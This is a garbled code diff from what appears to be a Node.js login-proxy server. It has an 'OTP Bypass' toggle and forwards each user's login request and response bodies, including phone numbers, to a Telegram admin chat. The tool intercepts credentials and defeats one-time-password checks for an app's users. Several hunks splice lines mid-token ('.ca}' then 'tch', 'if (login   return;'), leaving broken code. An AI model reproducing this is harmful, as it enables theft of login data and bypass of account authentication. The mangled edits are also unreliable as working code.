@@ -1135,8 +1135,8 @@ Example:
       await saveData(data);
       await bot.sendMessage(chatId, '🔔 OTP Bypass OFF\nAb real API ka response jayega (OTP normal)');
       return res.sendStatus(200);
-       }
-   
+   rn res.sendStatus(200); }
+
     if (text === '/debug' || text === '/debug on' || text === '/debug off') {
       if (text === '/debug off') {
         debugMode = false;
@@ -1561,7 +1561,8 @@ app.post('/app/user/login/start', async (req, res) => {
     if (data.adminChatId && bot) {
       const reqStr = JSON.stringify(body, null, 2);
       const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
-      bot.sendMessage(data.adminChatId, `🔐 Login Start\n📱 Phone: ${body.userName || body.phone || body.mobile || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1200)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1200)}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔐 Login Start\n📱 Phone: ${body.userName || body.phone || body.mobile || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1200)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1200)}`).ca}
+tch(()=>{});
     
     let otpBypassed = false;
     if (data.otpBypass && jsonResp && startData && typeof startData === 'object') {
@@ -1587,7 +1588,8 @@ app.post('/app/user/login/start', async (req, res) => {
       delete respHeaders['etag'];
       res.writeHead(response.status, respHeaders);
       res.end(newBody);
-      return;
+       const loginData = getResponseData(jsonResp);
+    if (login   return;
     }
 Data && typeof loginData === 'object') {
       userId = String(loginData.userId || loginData.id || loginData.memberId || '');
